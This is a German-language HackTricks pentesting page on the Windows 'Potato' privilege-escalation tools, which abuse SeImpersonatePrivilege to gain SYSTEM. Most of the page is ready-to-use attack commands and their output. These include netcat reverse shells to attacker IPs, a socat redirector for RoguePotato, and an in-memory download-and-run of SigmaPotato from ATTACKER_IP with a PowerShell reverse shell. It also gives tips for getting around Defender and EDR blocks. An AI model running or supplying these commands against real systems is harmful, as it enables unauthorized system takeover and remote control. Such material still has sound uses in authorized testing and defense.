# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato funktioniert nicht** auf Windows Server 2019 und Windows 10 Build 1809 und neuer. Allerdings können [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** verwendet werden, um dieselben Privilegien auszunutzen und Zugriff auf `NT AUTHORITY\SYSTEM` zu erlangen. Dieser [Blogbeitrag](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) behandelt `PrintSpoofer` ausführlich und zeigt, wie Impersonation-Privilegien auf Windows 10- und Server 2019-Hosts missbraucht werden können, auf denen JuicyPotato nicht mehr funktioniert.

> [!TIP]
> Eine moderne Alternative, die 2024–2025 häufig gepflegt wird, ist SigmaPotato (ein Fork von GodPotato), die In-Memory/.NET-Reflection-Nutzung und erweiterten OS-Support hinzufügt. Siehe die kurze Nutzung weiter unten und das Repo in den Referenzen.

Verwandte Seiten für Hintergrund und manuelle Techniken:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Anforderungen und häufige Fallstricke

Alle folgenden Techniken beruhen darauf, einen zur Impersonation fähigen privilegierten Service aus einem Kontext zu missbrauchen, der eine der folgenden Privilegien besitzt:

- SeImpersonatePrivilege (am häufigsten) oder SeAssignPrimaryTokenPrivilege
- Hohe Integrität ist nicht erforderlich, wenn das Token bereits SeImpersonatePrivilege besitzt (typisch für viele Service-Accounts wie IIS AppPool, MSSQL, usw.)

Prüfe Privilegien schnell:
```cmd
whoami /priv | findstr /i impersonate
```
Betriebsnotizen:

- Wenn Ihre Shell unter einem eingeschränkten Token ohne SeImpersonatePrivilege läuft (häufig bei Local Service/Network Service in einigen Kontexten), stellen Sie die Standardrechte des Kontos mit FullPowers wieder her, und führen Sie dann einen Potato aus. Beispiel: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer benötigt den Print Spooler-Dienst, der läuft und über den lokalen RPC-Endpunkt (spoolss) erreichbar ist. In gehärteten Umgebungen, in denen der Spooler nach PrintNightmare deaktiviert wurde, bevorzugen Sie RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato benötigt einen OXID-Resolver, der über TCP/135 erreichbar ist. Wenn Egress blockiert ist, verwenden Sie einen Redirector/Port-Forwarder (siehe Beispiel unten). Ältere Builds benötigten das -f flag.
- EfsPotato/SharpEfsPotato missbrauchen MS-EFSR; wenn eine Pipe blockiert ist, versuchen Sie alternative Pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fehler 0x6d3 während RpcBindingSetAuthInfo deutet typischerweise auf einen unbekannten/nicht unterstützten RPC-Authentifizierungsdienst hin; versuchen Sie eine andere Pipe/Transport oder stellen Sie sicher, dass der Zielservice läuft.

## Kurze Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Hinweise:
- Du kannst -i verwenden, um einen interaktiven Prozess in der aktuellen Konsole zu starten, oder -c, um einen einzeiligen Befehl auszuführen.
- Benötigt den Spooler service. Wenn er deaktiviert ist, schlägt das fehl.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Wenn ausgehender Port 135 blockiert ist, pivot den OXID-Resolver über socat auf Ihrem redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato ist ein neueres COM-Abuse-Primitiv, das Ende 2022 veröffentlicht wurde und den **PrintNotify**-Dienst anstelle des Spooler/BITS angreift. Die Binärdatei instanziiert den PrintNotify COM-Server, setzt ein gefälschtes `IUnknown` ein und löst dann einen privilegierten Callback über `CreatePointerMoniker` aus. Wenn der PrintNotify-Dienst (laufend als **SYSTEM**) zurückverbindet, dupliziert der Prozess das zurückgegebene Token und startet die übergebene Payload mit vollen Rechten.

Wichtige Betriebsnotizen:

* Funktioniert unter Windows 10/11 und Windows Server 2012–2022, solange der Print Workflow/PrintNotify-Dienst installiert ist (er ist auch vorhanden, wenn der Legacy-Spooler nach PrintNightmare deaktiviert wurde).
* Erfordert, dass der aufrufende Kontext das **SeImpersonatePrivilege** besitzt (typisch für IIS APPPOOL-, MSSQL- und Servicekonten für geplante Aufgaben).
* Akzeptiert entweder einen direkten Befehl oder einen interaktiven Modus, sodass du in der ursprünglichen Konsole bleiben kannst. Beispiel:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Da es rein COM-basiert ist, werden keine Named-Pipe-Listener oder externen Redirectors benötigt, wodurch es als Drop-in-Ersatz auf Hosts dient, auf denen Defender RoguePotato’s RPC binding blockiert.

Operatoren wie Ink Dragon starten PrintNotifyPotato unmittelbar nachdem sie ViewState RCE auf SharePoint erlangt haben, um vom `w3wp.exe`-Worker auf SYSTEM zu wechseln, bevor sie ShadowPad installieren.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Tipp: Wenn eine Pipe ausfällt oder EDR sie blockiert, versuche die anderen unterstützten Pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Hinweise:
- Funktioniert unter Windows 8/8.1–11 und Server 2012–2022, wenn SeImpersonatePrivilege vorhanden ist.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato bietet zwei Varianten, die Service-DCOM-Objekte anvisieren, welche standardmäßig RPC_C_IMP_LEVEL_IMPERSONATE verwenden. Kompiliere oder verwende die bereitgestellten binaries und führe deinen Befehl aus:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (aktualisierter GodPotato-Fork)

SigmaPotato bietet moderne Verbesserungen, wie z. B. in-memory execution via .NET reflection und einen PowerShell reverse shell-Helfer.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Referenzen

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
